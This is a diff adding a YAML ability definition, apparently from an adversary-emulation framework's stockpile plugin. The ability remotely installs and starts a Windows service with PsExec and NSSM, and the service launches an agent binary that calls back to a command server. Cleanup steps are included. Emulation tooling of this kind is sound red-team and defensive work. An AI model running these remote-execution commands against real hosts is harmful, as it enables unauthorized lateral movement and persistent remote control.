@@ -1,0 +1,47 @@
+- tactic: execution
+  technique_name: 'System Services: Service Execution'
+  technique_id: T1569.002
+  name: Service Creation
+  description: Create a service named "sandsvc" to execute remote 54ndc57 binary named
+    "s4ndc4t.exe"
+  executors:
+  - name: psh
+    platform: windows
+    command: '.\psexec.exe \\#{remote.host.fqdn} C:\Users\Public\nssm.exe install
+      sandsvc "C:\Users\Public\s4ndc4t.exe" "-server #{server} -v -originLinkID #{origin_link_id}";
+
+      sc.exe \\#{remote.host.fqdn} start sandsvc;
+
+      Start-Sleep -s 15;
+
+      Get-Process -ComputerName #{remote.host.fqdn} s4ndc4t;'
+    code: null
+    language: null
+    build_target: null
+    payloads:
+    - PsExec.exe
+    uploads: []
+    timeout: 300
+    parsers: []
+    cleanup:
+    - 'sc.exe \\#{remote.host.fqdn} stop sandsvc;
+
+      sc.exe \\#{remote.host.fqdn} delete sandsvc /f;
+
+      taskkill /s \\#{remote.host.fqdn} /FI "Imagename eq s4ndc4t.exe"'
+    variations: []
+    additional_info: {}
+  requirements:
+  - module: plugins.stockpile.app.requirements.no_backwards_movement
+    relationship_match:
+    - source: remote.host.fqdn
+  privilege: ''
+  repeatable: false
+  buckets:
+  - execution
+  additional_info: {}
+  access: {}
+  singleton: true
+  plugin: stockpile
+  delete_payload: true
+  id: 95727b87-175c-4a69-8c7a-a5d82746a753
